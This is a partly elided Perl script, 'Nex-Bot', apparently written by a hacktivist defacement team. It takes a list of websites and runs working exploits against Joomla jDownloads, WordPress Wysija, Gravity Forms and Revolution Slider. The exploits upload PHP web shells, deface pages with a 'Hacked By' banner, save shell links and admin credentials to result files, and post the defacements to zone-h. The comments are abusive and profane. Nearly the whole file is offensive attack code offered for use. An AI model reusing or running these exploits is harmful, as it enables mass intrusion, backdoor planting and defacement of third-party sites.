#!/usr/bin/perl
#First Big Deface Proget Nex-Bot 2015  © Coded By | ghosto | GMS_TEAM |
#The Code 4 Palestine The Love 4 Palestine and Life 4 For Palestine
#Hello Hater'z :* on This script you wil find :
#Auto cms detect
#[DRUPAL]
...
# auto post on zone-h & mirror zone ///////////////// here want to say they update da mirror zone with a fucking captcha :/ so i will update it on 2016 inshallah in the V2 of this Bot :)
# tmp folder Will content The scaned websites 
# All Result Will be Placed on Result Folder
#Don't Change da Damn Fucking Right Madafaking Bitch Lamerz 
#Changing da Fucking Right Won't Make You da facking Real Coder Madafaka
#If You want You can use da script but you dont need to play it da fucking smart Coder 
# Don't Use It Against Tunisian And Muslims Websites :)
#Thanks to :Tounsi TNT
#Greetz All Fallaga Team members all Muslims Every where 
# Fallag Gassrini Page :> https://www.facebook.com/ApProx12/
...
print colored("[ Nex-Bot |Coded By gassrni | My Friend fllaga_TEAM ]",'white on_blue'),"\n\n\n";
print colored ("Start At $datetime",'white on_red'),"\n\n";

open(tarrget,"<$ARGV[0]") or die "Fuck you where is Website list -_- bitch  \n";
while(<tarrget>){
chomp($_);
$site = $_;
...
print colored ("[BOOM] $site => User | $admin Password | $pass",'white on_yellow'),"\n";
    ...
    print save "Success Gass ! $site | username : gassrini | pass: admin\n";
    close(save);
    }
    elsif ($stat =~ /404/){
...
print colored ("[BOOM] $site=> User | $admin Password | $pass",'white on_yellow'),"\n";
    ...
    print save "Success Gass ! $site | username : $admin | pass: $pass\n";
...
$url =~ s/&amp;/&/gi;
 ...
 $check = $ua->get($shlz);
if($check->content =~/gassrini/ || $check->is_success ) {
 print" ........... ";
  print color('bold white');
print "[";
print color('reset');
...
$def = $site . '/images/jdownloads/screenshots/gass.html.j';
$filee="gass.rar";
$filezz="gass.html.j";
my $exploitx = $ua->post("$jdup", Cookie => "", Content_Type => "form-data", Content => [ name=>"Fallag Gassrini", mail=>"mr.leai3005@gmail.com", filetitle =>"Fallaga Team", catlist=>"1", license=>"0", language=>"0", system=>"0",file_upload=>["$filee"], pic_upload=>["$filezz"], description=>"<p>zot</p>", senden=>"Send file", option=>"com_jdownloads", view=>"upload", send=>"1", "24c22896d6fe6977b731543b3e44c22f"=>"1"]);
if ($exploit->decoded_content =~ /The file was successfully transferred to the server/) {
print " ................ ";
            print color('bold white');
print "[";
...
$def = $site . '/media/ghosto.txt';
$fabshell = $site . '/media/gass.PhP.txt';
##
$indfile="ghosto.txt";
$shelfile="gass.PhP.txt";
##
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
...
my $exploit = $ua->post("$site/$path", Content_Type => 'form-data', Content => [ $zokometheme => ['gassrini.zip', => 'gassrini.zip'], overwriteexistingtheme => "on",action => "themeupload", submitter => "Upload",]);

my $check = $ua->get("$site/wp-content/uploads/wysija/themes/Gassrini/herewgo.php")->content;
my $checkk = $ua->get("$site/xGSx.php")->content;
if($checkk =~/<form method=post>Password: <input type=password name=pass><input type=submit value=/) {
        open(save, '>>Result/vulntargets.txt');   
...
print "[SHELL LINK] => $site/xGSx.php\n";
    open(save, '>>Result/shells.txt');  
    print save "[WYSIJA] $site/xGSx.php\n"; 
    close(save);
...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $exploitgrav = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["Gass.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "Gass.php5"]);
if ($exploitgrav->decoded_content =~ /_input_3_Gass.php5/) {
    print " ................ ";
    print color('bold white');
print "[";
print color('reset');
...
print color('reset');
    ...
    open(save, '>>Result/libs.txt');
        print save "$site/_input_3_Gass.php5\n";
        close(save);
    my $checkgrav = $ua->get("$site/_input_3_Gass.php5")->content;
    my $checkkgrav = $ua->get("$site/xGSx.php")->content;
...
print "[SHELL LINK] => $site/xGSx.php \n";
        open(save, '>>Result/shells.txt');  
        print save "[GRAVITY]  $site/xGSx.php\n";   
        close(save);
...
$ua->timeout(10);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");
my $indexploit = $ua->post("$site/$path", Cookie => "", Content_Type => "form-data", Content => [file => ["def.jpg"], field_id => "3", form_id => "1",gform_unique_id => "../../../../../", name => "Gass.html"]);
print "[DEFACE] ....................";
if ($indexploit->decoded_content =~ /_input_3_Gass.html/) {
    $def= $site . '_input_3_Gass.html';
    print color('bold white');
print " [";
print color('reset');
print color('bold green');
...
$gassface = POST $ajx, ['action' => 'revslider_ajax_action', 'client_action' => 'update_captions_css', 'data' =>"<body style='color: transparent;background-color: black'><center><h1><b style='color: white'><center><b>Hacked By ismail ghosto</b><br>##### GMS_TEAM #####<p style='color: transparent'>"];
...
if($checkajx =~/Hacked|Fallaga|Gassrini/) {
...
my $exploitrevshellz = $ua->get("$site/xGSx.php")->content;
...
print "[SHELL LINK] => $site/xGSx.php\n";
    open(save, '>>Result/shells.txt');  
    print save "[REVSLIDER] $site/xGSx.php\n";  
    close(save);
...
print colored ("[ZONE-H]",'black on_yellow');
    ...
    close(save);
                                ...
                                $hack="ismail ghosto"; # chaneg ismail ghosto by Your zone h name :p - thats not recode lamerz lol ..//
...
$fgtn="ismail ghosto"; # u can change it by ur name on mirror zone and plz madafaking bitchs dont call this recode lol !
